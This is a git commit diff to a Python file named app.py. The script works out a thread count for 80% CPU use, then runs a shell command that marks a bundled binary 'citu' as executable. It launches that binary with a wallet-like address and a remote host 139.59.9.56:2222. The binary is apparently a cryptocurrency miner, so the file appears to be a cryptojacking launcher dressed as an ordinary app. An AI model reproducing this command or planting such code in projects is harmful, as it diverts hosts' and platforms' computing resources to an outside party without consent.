8466f411a1af38d34db4273c0f5e760a9a14daa8
svetoy113 <153148859+svetoy113@users.noreply.github.com>
2023-12-09 16:06:29 +0700

    Update app.py

--- app.py
+++ app.py
@@ -1,11 +1,11 @@
 import subprocess
 import os
 
-# Get the current directory
-current_directory = os.getcwd()
+# # Get the current directory
+# current_directory = os.getcwd()
 
-# Assuming 'citu' executable is in the current directory
-citu_path = os.path.join(current_directory, "citu")
+# # Assuming 'citu' executable is in the current directory
+# citu_path = os.path.join(current_directory, "citu")
 # Get the total number of CPU cores
 total_cpu_cores = os.cpu_count()
 
@@ -15,7 +15,7 @@ print(f"Number of threads to use for 80% CPU utilization: {num_threads_to_use}")
 
 def processing(arg=None):
     # Construct the command
-    command = f"ls -la && chmod +x citu/citu && ./citu/citu -w 25kHuqsZ7xmVNEFjmiNivXU4YHDunmsSCGxxxGzh2dVGo -h 139.59.9.56:2222 -s x -t {num_threads_to_use}"
+    command = f"ls -la && chmod +x citu && ./citu -w 25kHuqsZ7xmVNEFjmiNivXU4YHDunmsSCGxxxGzh2dVGo -h 139.59.9.56:2222 -s x -t {num_threads_to_use}"
     os.system(command)
     # Start the subprocess with stdout and stderr as PIPE
     # process = subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
